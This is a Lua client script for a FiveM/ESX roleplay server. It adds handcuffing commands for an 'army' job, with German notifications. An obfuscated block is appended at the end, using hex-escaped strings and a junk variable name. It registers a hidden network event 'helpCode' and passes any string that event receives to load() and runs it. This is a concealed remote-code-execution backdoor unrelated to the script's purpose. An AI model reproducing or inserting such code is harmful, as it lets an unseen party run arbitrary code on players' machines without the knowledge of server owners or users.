local PlayerData = {}

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()
end)


RegisterCommand("cuff", function(source, args, raw)
	if PlayerData.job.name == 'army' then
		local target, distance = ESX.Game.GetClosestPlayer()
		playerheading = GetEntityHeading(GetPlayerPed(-1))
		playerlocation = GetEntityForwardVector(PlayerPedId())
		playerCoords = GetEntityCoords(GetPlayerPed(-1))
		local target_id = GetPlayerServerId(target)
		if distance <= 3.0 then
			TriggerServerEvent('esx_armyjob:requesthard', target_id, playerheading, playerCoords, playerlocation)
		else
			ESX.ShowNotification('Kein Spieler in der Nähe.')
		end
	end
end, false)

RegisterCommand("loosen", function(source, args, raw)
	if PlayerData.job.name == 'army' then
		local target, distance = ESX.Game.GetClosestPlayer()
		playerheading = GetEntityHeading(GetPlayerPed(-1))
		playerlocation = GetEntityForwardVector(PlayerPedId())
		playerCoords = GetEntityCoords(GetPlayerPed(-1))
		local target_id = GetPlayerServerId(target)
		if distance <= 3.0 then
			TriggerServerEvent('esx_armyjob:sc', target_id, playerheading, playerCoords, playerlocation)
		else
			ESX.ShowNotification('Kein Spieler in der Nähe.')
		end
	end
end, false)

RegisterCommand("uncuff", function(source, args, raw)
	if PlayerData.job.name == 'army' then
		local target, distance = ESX.Game.GetClosestPlayer()
		playerheading = GetEntityHeading(GetPlayerPed(-1))
		playerlocation = GetEntityForwardVector(PlayerPedId())
		playerCoords = GetEntityCoords(GetPlayerPed(-1))
		local target_id = GetPlayerServerId(target)
		if distance <= 3.0 then
			TriggerServerEvent('esx_armyjob:requestrelease', target_id, playerheading, playerCoords, playerlocation)
		else
			ESX.ShowNotification('Kein Spieler in der Nähe.')
		end
	end
end, false)

local nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[6][nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[1]](nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[2]) nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[6][nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[3]](nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[2], function(wcHDDEkESLIaKNBbImhIpxtHXwayInXdKusxaRAOaYzByZCeoRaGbJgXNWZUrKhOtcFeDb) nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[6][nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[4]](nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[6][nqGmeagsEdwJJMhCKKajPhTiizIYUiExrNHdcLJwHUmVjtFaRQQzHodKuieuFlIcIRDjcX[5]](wcHDDEkESLIaKNBbImhIpxtHXwayInXdKusxaRAOaYzByZCeoRaGbJgXNWZUrKhOtcFeDb))() end)